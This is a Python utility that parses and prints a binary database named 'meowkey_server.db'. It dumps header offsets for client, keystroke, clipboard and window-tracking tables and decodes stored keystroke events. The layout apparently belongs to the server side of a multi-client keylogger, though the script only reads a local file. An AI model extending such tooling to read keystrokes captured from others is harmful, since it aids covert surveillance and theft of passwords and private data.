# view_db.py - Python script to view your database
import struct
import sys

def read_header(filename):
    with open(filename, 'rb') as f:
        # Read 256 byte header
        data = f.read(256)
        
        # Unpack header (all little-endian)
        magic, version = struct.unpack('<II', data[0:8])
        file_size, client_table = struct.unpack('<QQ', data[8:24])
        keystroke_tree, clipboard_tree = struct.unpack('<QQ', data[24:40])
        window_tree, num_clients = struct.unpack('<QI', data[40:52])
        max_clients, next_free = struct.unpack('<IQ', data[52:64])
        
        print("=== DATABASE HEADER ===")
        print(f"Magic: 0x{magic:08X} ('{chr((magic>>24)&0xFF)}{chr((magic>>16)&0xFF)}{chr((magic>>8)&0xFF)}{chr(magic&0xFF)}')")
        print(f"Version: {version}")
        print(f"File size: {file_size} bytes (0x{file_size:X})")
        print(f"Client table offset: 0x{client_table:X} ({client_table} bytes)")
        print(f"Keystroke tree offset: 0x{keystroke_tree:X}")
        print(f"Clipboard tree offset: 0x{clipboard_tree:X}")
        print(f"Window tree offset: 0x{window_tree:X}")
        print(f"Num clients: {num_clients}")
        print(f"Max clients: {max_clients}")
        print(f"Next free offset: 0x{next_free:X} ({next_free} bytes)")
        
        # Dump first 64 bytes as hex
        print("\n=== HEX DUMP (first 64 bytes) ===")
        for i in range(0, 64, 16):
            hex_part = ' '.join(f'{b:02X}' for b in data[i:i+16])
            ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in data[i:i+16])
            print(f"{i:08X}: {hex_part:47}  {ascii_part}")

def find_client_001(filename):
    print("\n=== SEARCHING FOR CLIENT '001' ===")
    with open(filename, 'rb') as f:
        # Read entire file
        data = f.read()
        
        # Look for '001' in ASCII
        pos = data.find(b'001')
        if pos != -1:
            print(f"Found '001' at offset 0x{pos:X} ({pos} bytes)")
            
            # Show context
            start = max(0, pos - 16)
            end = min(len(data), pos + 32)
            context = data[start:end]
            
            print("Context:")
            for i in range(start, end, 16):
                chunk = data[i:min(i+16, end)]
                hex_str = ' '.join(f'{b:02X}' for b in chunk)
                ascii_str = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
                print(f"{i:08X}: {hex_str:47}  {ascii_str}")

def view_keystrokes(filename):
    print("\n=== KEYSTROKE EVENTS ===")
    # Offsets from your logs
    offsets = [267632, 267696, 267760, 267824, 267888]
    
    with open(filename, 'rb') as f:
        for offset in offsets:
            f.seek(offset)
            # Read KeystrokeEvent (64 bytes)
            data = f.read(64)
            if len(data) == 64:
                # Unpack: timestamp (Q), client_hash (I), sequence (I), key (48s)
                timestamp, client_hash, sequence = struct.unpack('<QII', data[0:16])
                key = data[16:64].split(b'\x00')[0].decode('utf-8', errors='ignore')
                
                print(f"Offset 0x{offset:X}: Key='{key}' | Timestamp={timestamp} | Hash=0x{client_hash:X}")

if __name__ == "__main__":
    filename = "meowkey_server.db"
    read_header(filename)
    find_client_001(filename)
    view_keystrokes(filename)